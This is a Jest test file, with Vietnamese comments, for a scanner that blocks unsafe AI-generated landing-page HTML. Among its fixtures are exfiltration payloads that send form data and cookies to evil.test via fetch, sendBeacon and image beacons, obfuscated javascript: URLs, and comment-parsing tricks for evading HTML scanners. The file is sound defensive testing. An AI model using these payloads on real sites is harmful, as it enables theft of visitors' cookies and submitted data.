import { describe, expect, it } from '@jest/globals';
import {
  findUnsafeLandingHtml,
  assertLandingHtmlSafe,
  buildUnsafeOutputError,
  buildUnsafeRetryRule,
  describeUnsafeKinds,
  LANDING_UNSAFE_OUTPUT_CODE,
} from '../landingHtmlSafety.util.js';
import { scanHtmlTags, getAttr, decodeHtmlEntities } from '../landingHtmlScan.util.js';

/**
 * B-1 (2) — chốt an toàn đầu ra AI landing, mô hình "chặn đường lấy trộm dữ liệu / chạy mã từ nguồn ngoài,
 * KHÔNG chặn mã giao diện" (số đo production 04/10 trên 78 landing). Ba nhóm ca:
 *   1. MẪU THẬT từ production → PHẢI QUA (chặn nhầm khách là tác hại thật);
 *   2. biến thể độc → PHẢI CHẶN, đúng nhóm (net/exec/secret/redirect/…);
 *   3. ca lách do bộ quét hiểu HTML khác trình duyệt — payload là mã độc THẬT (fetch…), không phải alert.
 */

const page = (body, head = '') =>
  `<!DOCTYPE html><html lang="vi"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>` +
  `<title>T</title><script src="https://cdn.tailwindcss.com"></script>${head}</head><body>${body}</body></html>`;

const kinds = (html, opts = {}) => findUnsafeLandingHtml(html, opts).map((f) => f.kind);
const evil = 'https://evil.test';

// ---------------------------------------------------------------------------------------------------------
// Mẫu THẬT trích từ production 04/10 (do điều phối cung cấp): phải qua ở chế độ sinh mới (không bản cũ).
// ---------------------------------------------------------------------------------------------------------
const TAILWIND_CONFIG_REAL =
  '<script>tailwind.config = {\n' +
  '  theme: {\n' +
  '    extend: {\n' +
  "      colors: { primary: '#f97316', brand: { 50: '#fff7ed', 500: '#f97316', 900: '#7c2d12' } },\n" +
  "      fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'], display: ['Playfair Display', 'serif'] },\n" +
  "      keyframes: { fadeIn: { '0%': { opacity: '0' }, '100%': { opacity: '1' } } },\n" +
  "      animation: { fadeIn: 'fadeIn .6s ease-out both' },\n" +
  '    },\n' +
  '  },\n' +
  '};</script>';

const REAL_UI_SAMPLES = {
  'tailwind.config inline (≥34/78 trang)': TAILWIND_CONFIG_REAL,
  'onclick="closeZaloPopup()"': '<button onclick="closeZaloPopup()" class="x">Đóng</button>',
  'onclick="app.openQuickQRModal()"': '<button onclick="app.openQuickQRModal()" class="x">Quét QR</button>',
  'onerror ảnh dự phòng placehold.co': '<img src="/lp-assets/uploads/1/landing/a.png" alt="" onerror="this.src=\'https://placehold.co/600x400?text=Anh\'">',
  'onerror ảnh dự phòng + this.onerror=null': '<img src="/x.png" alt="" onerror="this.onerror=null;this.src=\'https://placehold.co/600x400/png\';">',
  'onerror với nháy là thực thể (&#39;)': '<img src="/x.png" alt="" onerror="this.src=&#39;https://placehold.co/600x400&#39;">',
  'onsubmit chuyển zalo.me sau 1 giây': '<form data-founderai-capture onsubmit="setTimeout(function(){ window.location.href = \'https://zalo.me/g/abc123\'; }, 1000);"><input name="email"/></form>',
  'onchange / onload giao diện': '<select onchange="document.getElementById(\'gia\').textContent = this.value"><option>1</option></select><body onload="this.classList.add(\'loaded\')"></body>',
  // Vòng 3 (đo production 04/10, 78 landing): gửi lead về Google Sheet (fetch 11 trang), popup localStorage (4 trang),
  // iframe youtube-nocookie / drive.google.com / zingmp3.vn, script src unpkg.com (2) / cdnjs.cloudflare.com (1).
  'popup localStorage.getItem("popupShown")':
    "<script>if (!localStorage.getItem('popupShown')) { setTimeout(function(){ document.getElementById('popup').classList.remove('hidden'); localStorage.setItem('popupShown', '1'); }, 3000); }</script>",
  'sessionStorage popup': "<script>if (!sessionStorage.getItem('seen')) { sessionStorage.setItem('seen', '1'); }</script>",
  'iframe youtube-nocookie': '<iframe src="https://www.youtube-nocookie.com/embed/abc" allowfullscreen></iframe>',
  'iframe drive.google.com': '<iframe src="https://drive.google.com/file/d/1AbC/preview" width="640" height="480"></iframe>',
  'iframe zingmp3.vn': '<iframe src="https://zingmp3.vn/embed/song/ZW123"></iframe>',
  'iframe campaign.digiso.vn': '<iframe src="https://campaign.digiso.vn/form/abc"></iframe>',
  'script src unpkg.com': '<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>',
  'script src cdnjs.cloudflare.com': '<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>',
};

/**
 * Khối "gửi form về Google Sheet" đúng mẫu production: URL gán vào biến rồi `fetch(biến, …)`, có/không `mode:'no-cors'`,
 * kèm chuyển sang nhóm Zalo sau khi gửi. Ba tên biến thực tế: GOOGLE_SCRIPT_URL / scriptURL / GOOGLE_SHEET_WEB_APP_URL.
 */
const sheetScript = (varName, { noCors = true, url = 'https://script.google.com/macros/s/AKfycbxAbC123_def/exec' } = {}) =>
  `<script>
const ${varName} = '${url}';
const form = document.getElementById('lead-form');
form.addEventListener('submit', function (e) {
  e.preventDefault();
  const formData = new FormData(form);
  fetch(${varName}, { method: 'POST', ${noCors ? "mode: 'no-cors', " : ''}body: formData })
    .then(() => { window.location.href = 'https://zalo.me/g/abc123'; })
    .catch((error) => console.error('Error!', error.message));
});
</script>`;
const SHEET_VAR_NAMES = ['GOOGLE_SCRIPT_URL', 'scriptURL', 'GOOGLE_SHEET_WEB_APP_URL'];

describe('landingHtmlSafety — MẪU THẬT từ production phải QUA (sinh mới)', () => {
  for (const [name, snippet] of Object.entries(REAL_UI_SAMPLES)) {
    it(name, () => {
      expect(findUnsafeLandingHtml(page(snippet))).toEqual([]);
    });
  }

  it('trang đủ bộ mẫu thật cùng lúc', () => {
    expect(findUnsafeLandingHtml(page(Object.values(REAL_UI_SAMPLES).join('')))).toEqual([]);
  });

  it('MẪU THẬT landing 9: khối Google Sheet có `scriptURL.startsWith(\'https://\')` — chuỗi chỉ có scheme không phải đích lạ → QUA', () => {
    const snippet = `<script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycbwExample/exec';
      async function send(formData) {
        if (scriptURL.startsWith('https://')) {
          await fetch(scriptURL, { method: 'POST', body: formData });
        } else {
          await new Promise((r) => setTimeout(r, 800));
        }
      }
    </script>`;
    expect(findUnsafeLandingHtml(page(snippet))).toEqual([]);
    // Đối chứng: vẫn bắt URL lạ thật trong cùng khối.
    expect(findUnsafeLandingHtml(page(snippet.replace('https://script.google.com', 'https://evil.example')))).not.toEqual([]);
  });

  it('gửi lead về Google Sheet (fetch tới script.google.com): cả 3 tên biến, có / không mode:"no-cors" → QUA', () => {
    for (const varName of SHEET_VAR_NAMES) {
      for (const noCors of [true, false]) {
        expect(findUnsafeLandingHtml(page(sheetScript(varName, { noCors })))).toEqual([]);
      }
    }
  });

  it('lời gọi mạng tới đích được phép khác: script.googleusercontent.com, docs.google.com (Forms), founderai.biz + tên miền con, tương đối, host trong văn bản nguồn', () => {
    const ok = [
      "fetch('https://script.googleusercontent.com/macros/echo?user_content_key=abc')",
      "fetch('https://docs.google.com/forms/d/e/1FAIpQLSabc/formResponse', { method: 'POST', mode: 'no-cors', body: d })",
      "fetch('https://api.founderai.biz/api/public/leads', { method: 'POST', body: d })",
      "fetch('/api/lead', { method: 'POST', body: d })",
      "fetch('submit.php', { method: 'POST', body: d })", // đối số đầu là chuỗi chữ tương đối
      "navigator.sendBeacon('https://script.google.com/macros/s/AKfy/exec', d)",
      "var x = new XMLHttpRequest(); x.open('POST', 'https://script.google.com/macros/s/AKfy/exec'); x.send(d)",
      "var u = '/api/lead'; fetch(u, { method: 'POST', body: d })", // URL tương đối gán vào biến trong cùng khối
    ];
    for (const code of ok) expect(kinds(page(`<script>${code}</script>`))).toEqual([]);
    const own = page("<script>fetch('https://api.cua-toi.vn/lead', { method: 'POST', body: d })</script>");
    expect(kinds(own)).toEqual(['net']);
    expect(kinds(own, { allowedSourceText: 'API của tôi: https://api.cua-toi.vn' })).toEqual([]);
  });

  it('handler on* gọi mạng tới đích được phép (chữ trong chính handler) → qua; đích động → chặn', () => {
    const ok = `<form onsubmit="fetch('https://script.google.com/macros/s/AKfy/exec', { method: 'POST', mode: 'no-cors', body: new FormData(this) }); return false;"></form>`;
    expect(kinds(page(ok))).toEqual([]);
    expect(kinds(page('<form onsubmit="fetch(window.TARGET, { body: new FormData(this) })"></form>'))).toEqual(['net']);
  });

  it('URL chuyển trang trong cùng khối với fetch (Zalo sau khi gửi Sheet) được kiểm bởi nhóm redirect, không bị tính vào nhóm net', () => {
    expect(findUnsafeLandingHtml(page(sheetScript('scriptURL')))).toEqual([]);
    const evilRedirect = page(sheetScript('scriptURL').replace('https://zalo.me/g/abc123', 'https://evil.test/login'));
    expect(kinds(evilRedirect)).toEqual(['redirect']);
  });

  it('localStorage / sessionStorage đơn thuần (không có lời gọi mạng) KHÔNG bị chặn; document.cookie thì có', () => {
    expect(kinds(page("<script>var s = localStorage.getItem('a'); sessionStorage.setItem('b', '1'); window.localStorage.removeItem('c');</script>"))).toEqual([]);
    expect(kinds(page('<script>var c = document.cookie</script>'))).toEqual(['secret']);
  });

  it('script src: unpkg.com, cdnjs, jsdelivr, Google Fonts/Tag Manager, pixel Facebook, founderai.biz, host trong văn bản nguồn → qua', () => {
    const srcs = [
      'https://unpkg.com/aos@2.3.1/dist/aos.js',
      'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js',
      'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js',
      'https://fonts.googleapis.com/css2?family=Inter',
      'https://www.googletagmanager.com/gtag/js?id=G-ABC123',
      'https://connect.facebook.net/en_US/fbevents.js',
      'https://founderai.biz/lp-track.js',
      '//unpkg.com/x.js',
    ];
    for (const src of srcs) expect(kinds(page(`<script src="${src}"></script>`))).toEqual([]);
    const own = page('<script src="https://static.cua-toi.vn/app.js"></script>');
    expect(kinds(own)).toEqual(['script']);
    expect(kinds(own, { allowedSourceText: 'Website https://static.cua-toi.vn' })).toEqual([]);
  });

  it('script giao diện thường gặp: đếm ngược, menu di động, FAQ, cuộn mượt, popup, năm hiện tại', () => {
    const scripts = [
      "var end = new Date('2026-12-31T23:59:59').getTime(); setInterval(function(){ var d = end - Date.now(); document.getElementById('cd').textContent = Math.floor(d/1000); }, 1000);",
      "document.getElementById('menu-btn').addEventListener('click', function(){ document.getElementById('menu').classList.toggle('hidden'); });",
      "document.querySelectorAll('.faq').forEach(function(el){ el.addEventListener('click', function(){ el.classList.toggle('open'); }); });",
      "document.querySelectorAll('a[href^=\"#\"]').forEach(function(a){ a.addEventListener('click', function(e){ e.preventDefault(); document.querySelector(a.getAttribute('href')).scrollIntoView({behavior:'smooth'}); }); });",
      "setTimeout(() => { document.getElementById('popup').classList.remove('hidden'); }, 5000);",
      "function showPopup(){ document.getElementById('popup').style.display = 'block'; } setTimeout(showPopup, 3000);",
      "document.getElementById('year').textContent = new Date().getFullYear(); window.scrollTo({ top: 0, behavior: 'smooth' });",
      "var t = setTimeout(function(){ el.classList.add('show'); }, 200); clearTimeout(t); setInterval(tick, 1000);",
    ];
    for (const code of scripts) expect(findUnsafeLandingHtml(page(`<script>${code}</script>`))).toEqual([]);
  });

  it('chuyển trang / gán đường dẫn tới đích được phép: zalo.me, m.me, wa.me, t.me, tel:, mailto:, #, tương đối, founderai.biz', () => {
    const targets = [
      "window.location.href = 'https://zalo.me/0900000000'",
      "location.href = 'https://m.me/trang-cua-toi'",
      "window.location = 'https://wa.me/84900000000'",
      "document.location.href = 'https://t.me/kenh'",
      "window.location.href = 'tel:0900000000'",
      "window.location.href = 'mailto:a@b.co'",
      "location.href = '#dang-ky'",
      "window.location.href = '/cam-on'",
      "location.assign('https://chat.zalo.me/?x=1')",
      "location.replace('thank-you.html')",
      "window.open('https://zalo.me/g/abc', '_blank')",
      "document.getElementById('v').src = 'https://www.youtube.com/embed/abc'",
      "a.href = 'https://founderai.biz/embed/lead-form?slug=x'",
      "el.setAttribute('href', 'https://zalo.me/abc')",
      "location.href = 'https://zalo.me/g/' + groupId",
      "location.href = target", // vế phải không phải chuỗi chữ: không đánh giá được → qua
    ];
    for (const code of targets) expect(kinds(page(`<script>${code}</script>`))).toEqual([]);
  });

  it('đích là host nằm trong văn bản nguồn (hồ sơ doanh nghiệp / yêu cầu người dùng) → qua', () => {
    const html = page('<script>window.location.href = "https://shop.cua-toi.vn/cam-on";</script>');
    expect(kinds(html)).toEqual(['redirect']);
    expect(kinds(html, { allowedSourceText: 'Website: https://shop.cua-toi.vn' })).toEqual([]);
    expect(kinds(html, { allowedSourceText: 'Landing cho https://www.shop.cua-toi.vn/san-pham' })).toEqual(['redirect']); // host khác (www.)
  });

  it('nhúng iframe được phép: MỌI https:// (YouTube, Vimeo, Maps, Drive, zingmp3, host lạ), //host, đường dẫn tương đối, about:blank; JSON-LD không chạy', () => {
    const embeds = [
      '<iframe src="https://zingmp3.vn/embed/song/ZW123"></iframe>',
      '<iframe src="https://drive.google.com/file/d/1AbC/preview"></iframe>',
      '<iframe src="https://anything.example.org/embed?x=1"></iframe>',
      '<iframe src="//anything.example.org/embed"></iframe>',
      '<iframe src="https://www.youtube.com/embed/abc" allowfullscreen></iframe>',
      '<iframe src="https://www.youtube-nocookie.com/embed/abc"></iframe>',
      '<iframe src="https://player.vimeo.com/video/123"></iframe>',
      '<iframe src="https://www.google.com/maps/embed?pb=!1m18"></iframe>',
      '<iframe src="https://maps.google.com/maps?q=hanoi&output=embed"></iframe>',
      '<iframe src="https://founderai.biz/embed/lead-form?slug=a"></iframe>',
      '<iframe src="/embed/lead-form?slug=a"></iframe>',
      '<iframe src="about:blank"></iframe>',
    ];
    for (const e of embeds) expect(kinds(page(e))).toEqual([]);
    expect(kinds(page('<script type="application/ld+json">{"@type":"Organization"}</script>'))).toEqual([]);
  });

  it('trang Tailwind điển hình có form capture, liên kết ngoài, ảnh, JSON-LD → không có điểm lạ', () => {
    const html = page(
      '<h1 class="text-3xl">Khoá học</h1>' +
        '<a href="https://example.com/x?a=1&amp;b=2">Xem</a> <a href="/#gia">Giá</a> <a href="mailto:a@b.c">Mail</a> <a href="tel:0900000000">Gọi</a>' +
        '<img src="https://x.test/a.png" alt="a" class="w-10"/>' +
        '<form data-founderai-capture><input name="email" type="email"/><button type="submit">Gửi</button></form>' +
        '<div data-onclick="x" class="online once">onclick="văn bản thường" javascript:void(0) fetch(x) trong chữ</div>' +
        '<p>a < b và 1 <2</p>',
      '<script type="application/ld+json">{"@type":"Organization","name":"A"}</script>'
    );
    expect(findUnsafeLandingHtml(html)).toEqual([]);
  });

  it('Tailwind CDN: https, có query, có phiên bản, protocol-relative đều được; host khác tên miền giả thì không', () => {
    expect(kinds('<script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>')).toEqual([]);
    expect(kinds('<script src="https://cdn.tailwindcss.com/3.4.1"></script>')).toEqual([]);
    expect(kinds('<script src="//cdn.tailwindcss.com"></script>')).toEqual([]);
    expect(kinds('<script src="http://cdn.tailwindcss.com"></script>')).toEqual(['script']);
    expect(kinds('<script src="https://cdn.tailwindcss.com.evil.test/x.js"></script>')).toEqual(['script']);
    expect(kinds('<script src="https://evil.test/cdn.tailwindcss.com"></script>')).toEqual(['script']);
  });

  it('form action rỗng / # / đường dẫn tương đối không bị coi là "ra ngoài"', () => {
    expect(kinds('<form action=""></form>')).toEqual([]);
    expect(kinds('<form action="#dang-ky"></form>')).toEqual([]);
    expect(kinds('<form action="/submit"></form>')).toEqual([]);
    expect(kinds('<form action="submit.php" method="post"></form>')).toEqual([]);
  });

  it('khối dữ liệu không chạy (ld+json, template, json) không bị chặn', () => {
    expect(kinds('<script type="text/template"><div onclick="fetch(1)"></div></script>')).toEqual(['net']); // quét kép: handler trong mẫu vẫn bị soi
    expect(kinds('<script type="application/json">{"a":1}</script>')).toEqual([]);
    expect(kinds('<script type="text/template"><p>x</p></script>')).toEqual([]);
  });
});

// ---------------------------------------------------------------------------------------------------------
// Biến thể ĐỘC phải CHẶN
// ---------------------------------------------------------------------------------------------------------
describe('landingHtmlSafety — biến thể độc PHẢI CHẶN, đúng nhóm', () => {
  it('net: fetch gửi dữ liệu form ra ngoài (script inline)', () => {
    const html = page(
      `<script>document.querySelector('form').addEventListener('submit', function(e){ fetch('${evil}/collect', { method: 'POST', body: new FormData(e.target) }); });</script>`
    );
    expect(kinds(html)).toEqual(['net']);
  });

  it('net: sendBeacon, XMLHttpRequest, WebSocket, EventSource, importScripts, import(), axios, $.ajax, window.fetch', () => {
    const codes = [
      `navigator.sendBeacon('${evil}', JSON.stringify(data))`,
      `var x = new XMLHttpRequest(); x.open('POST', '${evil}'); x.send(d)`,
      `new WebSocket('wss://evil.test/ws')`,
      `new EventSource('${evil}/sse')`,
      `importScripts('${evil}/x.js')`,
      `import('${evil}/x.js')`,
      `axios.post('${evil}', d)`,
      `$.ajax({ url: '${evil}' })`,
      `$.post('${evil}', d)`,
      `window.fetch('${evil}')`,
      `self.fetch('${evil}')`,
      `fetch ( '${evil}' )`,
    ];
    for (const code of codes) expect(kinds(page(`<script>${code}</script>`))).toContain('net');
  });

  it('secret: document.cookie, cookieStore (localStorage/sessionStorage KHÔNG còn bị chặn)', () => {
    for (const code of ['var c = document.cookie', 'window.document.cookie = "a=1"', 'cookieStore.getAll()']) {
      expect(kinds(page(`<script>${code}</script>`))).toContain('secret');
    }
  });

  it('net: fetch tới host LẠ — gán qua biến trong cùng khối, ghép chuỗi, lẫn với URL Google Sheet hợp lệ → CHẶN', () => {
    // gán qua biến
    expect(kinds(page(sheetScript('scriptURL', { url: `${evil}/collect` })))).toEqual(['net']);
    expect(kinds(page(`<script>const GOOGLE_SCRIPT_URL = '${evil}/exec'; fetch(GOOGLE_SCRIPT_URL, { method: 'POST', body: d })</script>`))).toEqual(['net']);
    // ghép chuỗi: vế chữ đầu là host lạ
    expect(kinds(page(`<script>fetch('${evil}/c?d=' + encodeURIComponent(data))</script>`))).toEqual(['net']);
    // URL Google Sheet hợp lệ NHƯNG khối còn một URL chữ tới host lạ (sao lưu lead ra ngoài)
    const both = page(`<script>const backup = '${evil}/backup'; ${sheetScript('scriptURL').replace('<script>', '').replace('</script>', '')}</script>`);
    expect(kinds(both)).toEqual(['net']);
    // host giả mạo bằng đuôi / tiền tố
    expect(kinds(page("<script>fetch('https://script.google.com.evil.test/exec', { body: d })</script>"))).toEqual(['net']);
    expect(kinds(page("<script>fetch('https://evilscript.google.com.test/exec', { body: d })</script>"))).toEqual(['net']);
    expect(kinds(page("<script>fetch('https://notfounderai.biz/x', { body: d })</script>"))).toEqual(['net']);
    // template URL không đọc được host
    expect(kinds(page('<script>fetch(`https://${host}/x`, { body: d })</script>'))).toEqual(['net']);
  });

  it('net: lời gọi mạng mà khối KHÔNG có URL chữ nào (đích động) → CHẶN', () => {
    const dynamic = [
      'fetch(url, { method: "POST", body: d })',
      'fetch(document.getElementById("t").value, { body: d })',
      'fetch(window.TARGET)',
      'var u = location.search.slice(1); fetch(u)',
      'var x = new XMLHttpRequest(); x.open("POST", target); x.send(d)',
      'navigator.sendBeacon(target, d)',
      'const scriptURL = document.currentScript.dataset.url; fetch(scriptURL, { body: d })',
    ];
    for (const code of dynamic) expect(kinds(page(`<script>${code}</script>`))).toEqual(['net']);
  });

  it('net: URL chỉ nằm trong chú thích hoặc regex không được tính là "có URL chữ"', () => {
    expect(kinds(page("<script>// https://script.google.com/macros/s/x/exec\nfetch(target, { body: d })</script>"))).toEqual(['net']);
    expect(kinds(page("<script>/* https://script.google.com/exec */ fetch(target)</script>"))).toEqual(['net']);
  });

  it('net: nháy nằm trong regex không làm lệch cặp nháy → URL chữ hợp lệ vẫn được nhận ra', () => {
    const code = "var clean = (s) => s.replace(/[\"']/g, ''); fetch('https://script.google.com/macros/s/AKfy/exec', { method: 'POST', body: clean(d) })";
    expect(kinds(page(`<script>${code}</script>`))).toEqual([]);
  });

  it('net: sendBeacon tới host lạ; handler fetch tới host lạ; XHR tới host lạ → CHẶN', () => {
    expect(kinds(page(`<script>navigator.sendBeacon('${evil}/b', JSON.stringify(data))</script>`))).toEqual(['net']);
    expect(kinds(page(`<form onsubmit="fetch('${evil}/c', { method: 'POST', body: new FormData(this) })"></form>`))).toEqual(['net']);
    expect(kinds(page(`<script>var x = new XMLHttpRequest(); x.open('POST', '${evil}/x'); x.send(d)</script>`))).toEqual(['net']);
  });

  it('iframe: scheme khác https, javascript:, data:, srcdoc vẫn chặn', () => {
    expect(kinds('<iframe src="http://example.org/x"></iframe>')).toEqual(['iframe']);
    expect(kinds('<iframe src="ftp://example.org/x"></iframe>')).toEqual(['iframe']);
    expect(kinds('<iframe src="blob:https://example.org/uuid"></iframe>')).toEqual(['iframe']);
    expect(kinds('<iframe src="file:///etc/passwd"></iframe>')).toEqual(['iframe']);
    expect(kinds('<iframe src="javascript:alert(1)"></iframe>')).toEqual(['jsurl']);
    expect(kinds('<iframe src="data:text/html,<script>1</script>"></iframe>')).toEqual(['jsurl']);
    expect(kinds('<iframe src="data:application/pdf;base64,AAAA"></iframe>')).toEqual(['iframe']);
    expect(kinds('<iframe srcdoc="<p>x</p>" src="https://example.org"></iframe>')).toEqual(['srcdoc']);
  });

  it('redirect: nút chia sẻ / kênh mạng xã hội được phép; mạng xã hội lạ và host giả thì chặn', () => {
    const ok = [
      "window.open('https://www.facebook.com/sharer/sharer.php?u=' + location.href)",
      "window.open('https://zalo.me/share?u=x')",
      "location.href = 'https://fb.me/trang'",
      "location.href = 'https://www.messenger.com/t/abc'",
      "window.open('https://www.tiktok.com/@abc')",
      "location.href = 'https://www.youtube.com/watch?v=abc'",
      "location.href = 'https://docs.google.com/forms/d/e/abc/viewform'",
      "location.href = 'https://forms.gle/abc'",
    ];
    for (const code of ok) expect(kinds(page(`<script>${code}</script>`))).toEqual([]);
    expect(kinds(page("<script>window.open('https://www.facebook.com.evil.test/sharer')</script>"))).toEqual(['redirect']);
    expect(kinds(page("<script>window.open('https://twitter.com/share')</script>"))).toEqual(['redirect']);
  });

  it('exec: eval, new Function, Function(, document.write, setTimeout/setInterval với đối số chuỗi', () => {
    for (const code of [
      "eval('alert(1)')",
      "new Function('return 1')()",
      "Function('return 1')()",
      "document.write('<b>x</b>')",
      "document.writeln('x')",
      "setTimeout('doEvil()', 100)",
      'setTimeout("doEvil()", 100)',
      'setTimeout(`doEvil()`, 100)',
      "setInterval ( 'tick()' , 1000)",
      "window.setTimeout('x()', 1)",
    ]) {
      expect(kinds(page(`<script>${code}</script>`))).toContain('exec');
    }
  });

  it('redirect: location / href / src / open gán sang địa chỉ LẠ', () => {
    const codes = [
      `window.location.href = '${evil}/login'`,
      `location.href = "${evil}"`,
      `window.location = '${evil}'`,
      `document.location.href = '${evil}'`,
      `top.location = '${evil}'`,
      `location.assign('${evil}')`,
      `location.replace('${evil}')`,
      `window.open('${evil}', '_blank')`,
      `a.href = '${evil}'`,
      `new Image().src = '${evil}/p?d=' + data`,
      `img.src = '${evil}/x.png'`,
      `form.action = '${evil}/collect'`,
      `el.setAttribute('href', '${evil}')`,
      `el.setAttribute("src", "${evil}/x")`,
      `window.location.href = 'https://zalo.me.evil.test/g/x'`, // đuôi giả
      `window.location.href = 'https://evilzalo.me/g/x'`, // tiền tố giả
      `window.location.href = '//evil.test/x'`,
      `window.location.href = 'javascript:alert(1)'`,
      `window.location.href = 'data:text/html,<script>1</script>'`,
      `window.location.href = 'ftp://evil.test/x'`,
    ];
    for (const code of codes) expect(kinds(page(`<script>${code}</script>`))).toContain('redirect');
  });

  it('this.src = chuỗi (ảnh dự phòng của chính thẻ img) luôn qua — kể cả host lạ, vì không mang được dữ liệu', () => {
    expect(kinds(page(`<img src="/x.png" onerror="this.src='${evil}/fallback.png'">`))).toEqual([]);
  });

  it('handler on*: cùng bộ chặn — onerror gọi fetch, onclick chuyển trang lạ, onsubmit đọc cookie, onload sendBeacon', () => {
    expect(kinds(page(`<img src="x" onerror="fetch('${evil}/?'+document.cookie)">`)).sort()).toEqual(['net', 'secret']);
    expect(kinds(page(`<button onclick="location.href='${evil}/login'">x</button>`))).toEqual(['redirect']);
    expect(kinds(page(`<form onsubmit="new Image().src='${evil}/?c='+document.cookie">x</form>`)).sort()).toEqual(['redirect', 'secret']);
    expect(kinds(page(`<body onload="navigator.sendBeacon('${evil}', 'x')"></body>`))).toEqual(['net']);
    expect(kinds(page(`<div onclick="eval(this.dataset.code)"></div>`))).toEqual(['exec']);
    expect(kinds(page(`<div onclick="setTimeout('x()', 1)"></div>`))).toEqual(['exec']);
    // handler viết hoa, nháy thực thể
    expect(kinds(page(`<img src="x" ONERROR="fetch(&#39;${evil}&#39;)">`))).toEqual(['net']);
  });

  it('refetch( / prefetchImages( / tên có chữ fetch KHÔNG bị coi là gọi mạng', () => {
    expect(kinds(page('<script>function prefetchImages(){} prefetchImages(); app.refetch(); var fetcher = 1; var s = "fetch";</script>'))).toEqual([]);
  });

  it('tailwind.config: thuần cấu hình qua; cấu hình có chèn mã độc / có thêm lệnh khác thì bị soi như script thường', () => {
    expect(kinds(page(TAILWIND_CONFIG_REAL))).toEqual([]);
    expect(kinds(page(`<script>tailwind.config = { theme: { extend: { colors: { x: (function(){ fetch('${evil}'); return '#fff'; })() } } } }</script>`))).toEqual(['net']);
    expect(kinds(page(`<script>tailwind.config = { theme: {} }; document.cookie;</script>`))).toEqual(['secret']);
    expect(kinds(page(`<script>tailwind.config = { theme: {} }; window.location.href = '${evil}'</script>`))).toEqual(['redirect']);
  });

  it('script ngoài lạ; kẻ gian tự host lp-track.js / founderai-capture.js / form-embed.js KHÔNG được coi là script hệ thống', () => {
    expect(kinds(page(`<script src="${evil}/x.js"></script>`))).toEqual(['script']);
    for (const name of ['lp-track.js', 'founderai-capture.js', 'form-embed.js']) {
      expect(kinds(page(`<script src="${evil}/${name}" defer></script>`))).toEqual(['script']);
    }
  });

  it('script không đóng, tự đóng, viết hoa, chen khoảng trắng: bắt theo nội dung / luôn bắt khi tự đóng', () => {
    expect(kinds(`<div><script>fetch('${evil}')`)).toEqual(['net']);
    expect(kinds(`<SCRIPT SRC=//evil.test/x.js></SCRIPT>`)).toEqual(['script']);
    expect(kinds('<script\n  src = "https://evil.test/x.js"\n></script>')).toEqual(['script']);
    expect(kinds('<svg><script/><img src=x></svg>')).toContain('script');
  });

  it('javascript: / vbscript: / data:text/html, kể cả che bằng chữ hoa, tab, xuống dòng, thực thể', () => {
    const bad = [
      '<a href="javascript:alert(1)">x</a>',
      '<a href="JaVaScRiPt:alert(1)">x</a>',
      '<a href="  javascript:alert(1)">x</a>',
      '<a href="java\tscript:alert(1)">x</a>',
      '<a href="java\nscript:alert(1)">x</a>',
      '<a href="&#106;avascript:alert(1)">x</a>',
      '<a href="&#x6A;avascript&colon;alert(1)">x</a>',
      '<a href="javascript&#58;alert(1)">x</a>',
      '<a href="java&Tab;script:alert(1)">x</a>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<form action="javascript:alert(1)"></form>',
      '<object data="data:text/html;base64,PHNjcmlwdD4="></object>',
      '<a href="vbscript:msgbox(1)">x</a>',
    ];
    for (const html of bad) expect(kinds(html)).toContain('jsurl');
  });

  it('form action / formaction ra ngoài (http, https, //host, scheme lạ, \\\\host)', () => {
    expect(kinds('<form action="https://evil.test/collect" method="post"></form>')).toEqual(['action']);
    expect(kinds('<form action="http://evil.test"></form>')).toEqual(['action']);
    expect(kinds('<form action="//evil.test/x"></form>')).toEqual(['action']);
    expect(kinds('<form action="\\\\evil.test"></form>')).toEqual(['action']);
    expect(kinds('<form action="ftp://evil.test"></form>')).toEqual(['action']);
    expect(kinds('<form action="  HTTPS://evil.test"></form>')).toEqual(['action']);
    expect(kinds('<button formaction="https://evil.test">x</button>')).toEqual(['action']);
    expect(kinds('<input type="submit" formaction="//evil.test">')).toEqual(['action']);
  });

  it('srcdoc, meta refresh, base href, thẻ chữ thô lồng quá sâu', () => {
    expect(kinds('<iframe srcdoc="<p>hi</p>"></iframe>')).toEqual(['srcdoc']);
    expect(kinds('<meta http-equiv="refresh" content="0;url=https://evil.test">')).toEqual(['meta']);
    expect(kinds('<META HTTP-EQUIV=Refresh CONTENT="5">')).toEqual(['meta']);
    expect(kinds('<base href="https://evil.test/">')).toEqual(['base']);
    expect(kinds('<style>'.repeat(10) + 'x')).toContain('structure');
  });

  it('meta khác (viewport, description) và base không có href không bị chặn', () => {
    expect(kinds('<meta name="viewport" content="width=device-width"><meta http-equiv="X-UA-Compatible" content="IE=edge"><base target="_blank">')).toEqual([]);
  });
});

// ---------------------------------------------------------------------------------------------------------
// Lối lách do parser hiểu khác trình duyệt — payload là mã độc thật
// ---------------------------------------------------------------------------------------------------------
describe('landingHtmlSafety — lối lách do parser hiểu khác trình duyệt (mỗi ca là một bài kiểm bộ quét)', () => {
  const PAYLOAD = `<script>fetch('${evil}/c', { body: document.cookie })</script>`;

  it('script nằm sau thuộc tính có `<!--` trong giá trị → vẫn là script thật', () => {
    expect(kinds(`<a title="<!-- "></a>${PAYLOAD}<a title=" -->"></a>`).sort()).toEqual(['net', 'secret']);
  });

  it('chú thích đóng sớm `<!-->`, `<!--->` và `--!>` không che được script phía sau', () => {
    expect(kinds(`<!-->${PAYLOAD}`)).toContain('net');
    expect(kinds(`<!--->${PAYLOAD}`)).toContain('net');
    expect(kinds(`<!-- x --!>${PAYLOAD}`)).toContain('net');
  });

  it('script thật nằm giữa hai chú thích có nháy kép → bắt được (chú thích đóng ở `-->` đầu tiên)', () => {
    expect(kinds(`<!-- <a title=" -->${PAYLOAD}<!-- "> -->`)).toContain('net');
  });

  it('script bên trong chú thích thì KHÔNG phải script (trình duyệt không chạy)', () => {
    expect(kinds(`<!-- ${PAYLOAD} --><p>x</p>`)).toEqual([]);
    expect(kinds('<!--[if IE]><script src="x.js"></script><![endif]--><p>x</p>')).toEqual([]);
  });

